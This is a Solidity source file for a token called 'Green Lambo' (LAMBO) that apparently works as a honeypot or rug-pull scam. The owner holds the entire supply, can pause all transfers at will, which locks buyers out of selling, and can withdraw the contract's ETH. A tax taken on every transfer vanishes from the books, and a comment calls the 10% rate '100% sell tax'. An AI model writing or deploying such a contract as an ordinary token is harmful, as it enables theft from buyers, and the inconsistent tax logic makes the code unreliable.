// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract LAMBO {
    string public name = "Green Lambo";
    string public symbol = "LAMBO";
    uint256 public totalSupply = 1_000_000_000 * 10 ** 18; // 1 billion tokens
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;

    bool public sellingPaused = false;
    uint256 public sellTaxPercentage = 10; // 100% sell tax

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    modifier whenNotPaused() {
        require(!sellingPaused, "Selling is paused.");
        _;
    }

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }

    function transfer(address to, uint256 value) external whenNotPaused returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external whenNotPaused returns (bool) {
        require(value <= balanceOf[from], "Insufficient balance");
        require(value <= allowance[from][msg.sender], "Insufficient allowance");

        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        uint256 currentValue = allowance[msg.sender][spender];
        allowance[msg.sender][spender] = currentValue + addedValue;

        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentValue = allowance[msg.sender][spender];
        require(currentValue >= subtractedValue, "Decreased allowance below zero");

        allowance[msg.sender][spender] = currentValue - subtractedValue;

        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function pauseSelling() external onlyOwner {
        sellingPaused = true;
    }

    function resumeSelling() external onlyOwner {
        sellingPaused = false;
    }

    function withdrawCurrency(address payable to, uint256 amount) external onlyOwner {
        require(amount <= address(this).balance, "Insufficient contract balance");
        to.transfer(amount);
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0), "Invalid recipient");
        require(value <= balanceOf[from], "Insufficient balance");

        uint256 sellTaxAmount = (value * sellTaxPercentage) / 100;
        uint256 transferAmount = value - sellTaxAmount;

        balanceOf[from] -= value;
        balanceOf[to] += transferAmount;

        emit Transfer(from, to, transferAmount);
    }
}